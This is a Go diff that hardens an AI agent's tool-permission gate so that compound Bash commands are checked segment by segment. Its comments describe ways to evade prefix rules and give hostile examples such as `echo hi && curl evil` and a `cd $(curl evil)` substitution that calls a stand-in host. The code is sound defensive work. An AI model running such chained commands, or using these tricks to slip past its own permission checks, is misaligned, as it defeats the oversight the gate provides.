@@ -254,9 +254,16 @@ func (g *Gate) Check(toolName, toolInput string) Decision {
 		}
 	}
 
-	// Deny list is checked first (highest priority).
+	// For Bash, decompose the command so rules are matched against each command
+	// that actually runs. Matching the raw string alone is not a boundary: a
+	// denied program hidden after `&&` never matches a prefix rule, and a leading
+	// space is enough to dodge one. Empty for non-Bash or unparseable input, in
+	// which case matching falls back to the raw string only.
+	segments := bashSegments(toolName, toolInput)
+
+	// Deny list is checked first (highest priority). Any segment is enough.
 	for _, rule := range deny {
-		if matchRule(rule, toolName, toolInput) {
+		if matchRuleAnySegment(rule, toolName, toolInput, segments) {
 			return DecisionDeny
 		}
 	}
@@ -275,23 +282,15 @@ func (g *Gate) Check(toolName, toolInput string) Decision {
 		return DecisionAsk
 	}
 
-	// Session-level allow (from "always allow" prompts).
-	for _, rule := range sessionAllow {
-		if matchRule(rule, toolName, toolInput) {
-			return DecisionAllow
-		}
+	// Allow lists. Session-level ("always allow" prompts) and settings rules are
+	// considered together so a command can be approved by a mix of both.
+	if allowsInput(toolName, toolInput, segments, sessionAllow, allow) {
+		return DecisionAllow
 	}
 
-	// Settings allow list.
-	for _, rule := range allow {
-		if matchRule(rule, toolName, toolInput) {
-			return DecisionAllow
-		}
-	}
-
-	// Ask list — forces prompt even if mode would normally allow.
+	// Ask list — forces prompt even if mode would normally allow. Any segment.
 	for _, rule := range ask {
-		if matchRule(rule, toolName, toolInput) {
+		if matchRuleAnySegment(rule, toolName, toolInput, segments) {
 			return DecisionAsk
 		}
 	}
@@ -312,6 +311,105 @@ func (g *Gate) Check(toolName, toolInput string) Decision {
 		return DecisionAsk
 	}
 	return DecisionAsk
+}
+
+// bashSegments returns the individual commands a Bash invocation would run.
+// Returns nil for non-Bash tools and for input that does not parse, so callers
+// fall back to matching the raw string rather than matching nothing.
+func bashSegments(toolName, toolInput string) []string {
+	if !strings.EqualFold(toolName, "Bash") {
+		return nil
+	}
+	segs, ok := shellsafe.SplitForPermissions(toolInput)
+	if !ok {
+		return nil
+	}
+	return segs
+}
+
+// matchRuleAnySegment reports whether rule matches the raw input or any single
+// command within it. Used for deny and ask, where one match is enough.
+func matchRuleAnySegment(rule, toolName, toolInput string, segments []string) bool {
+	if matchRule(rule, toolName, toolInput) {
+		return true
+	}
+	for _, seg := range segments {
+		if matchRule(rule, toolName, seg) {
+			return true
+		}
+	}
+	return false
+}
+
+// allowsInput reports whether the allow lists approve this call.
+//
+// For a compound Bash command every segment must be allowed. Approving the
+// whole command because its first word matched a prefix rule is an escalation:
+// `Bash(echo:*)` would otherwise auto-approve `echo hi && curl evil`.
+//
+// The one shortcut is a wildcard-free rule that spells out the entire command
+// verbatim, so a deliberate rule like `Bash(git add -A && git commit)` keeps
+// working. It is compared against the untouched input — not the StripLeadingCd
+// form — because otherwise `Bash(make test)` would approve
+// `cd $(curl evil) && make test`, whose substitution runs before make does.
+func allowsInput(toolName, toolInput string, segments []string, lists ...[]string) bool {
+	anyRule := func(f func(rule string) bool) bool {
+		for _, list := range lists {
+			for _, rule := range list {
+				if f(rule) {
+					return true
+				}
+			}
+		}
+		return false
+	}
+
+	// Non-Bash tools, unparseable input, and single commands keep the original
+	// whole-string semantics — there is nothing to escalate across.
+	if len(segments) <= 1 {
+		return anyRule(func(rule string) bool { return matchRule(rule, toolName, toolInput) })
+	}
+
+	if anyRule(func(rule string) bool { return exactRuleMatchesWholeInput(rule, toolName, toolInput) }) {
+		return true
+	}
+	for _, seg := range segments {
+		if isBenignCd(seg) {
+			continue
+		}
+		if !anyRule(func(rule string) bool { return matchRule(rule, toolName, seg) }) {
+			return false
+		}
+	}
+	return true
+}
+
+// exactRuleMatchesWholeInput reports whether a wildcard-free rule names the
+// entire command verbatim.
+func exactRuleMatchesWholeInput(rule, toolName, toolInput string) bool {
+	paren := strings.IndexByte(rule, '(')
+	if paren < 0 || !strings.HasSuffix(rule, ")") {
+		return false
+	}
+	if !strings.EqualFold(rule[:paren], toolName) {
+		return false
+	}
+	pattern := rule[paren+1 : len(rule)-1]
+	if strings.Contains(pattern, "*") {
+		return false
+	}
+	return pattern == toolInput
+}
+
+// isBenignCd reports whether a segment is a plain directory change, which
+// matchRule already treats as normalization rather than an action (see
+// shellsafe.StripLeadingCd). A cd whose argument contains a substitution is not
+// benign — that substitution executes.
+func isBenignCd(seg string) bool {
+	if seg != "cd" && !strings.HasPrefix(seg, "cd ") {
+		return false
+	}
+	return !strings.Contains(seg, "$(") && !strings.Contains(seg, "`") && !strings.Contains(seg, "<(")
 }
 
 // matchRule returns true if the rule matches toolName(toolInput).
